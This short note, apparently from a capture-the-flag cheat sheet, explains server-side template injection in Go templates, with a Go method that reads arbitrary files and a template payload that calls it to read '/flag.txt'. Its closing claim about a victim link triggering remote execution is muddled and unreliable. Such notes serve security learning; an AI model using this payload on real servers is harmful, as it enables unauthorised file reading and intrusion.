## How to identify?
If you have access to the code and you see that the go is the code then you are gucci!

## How to exploit?
You can access the properties with `{{ .PROPRETYNAME }}`
**Example:**
Take into consideration the following proprety that reads a LFI:
```
func (p RequestData) OutFileContents(filePath string) string {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err.Error()
	}
	return string(data)
}
```
This code expects a file to read and we can exploit by adding a file **template.txt** with:
```
{{ .OutFileContents "/flag.txt" }}
```
(Sending the link to the victim of the code it will fetch the SSTI remote and execute the code!)
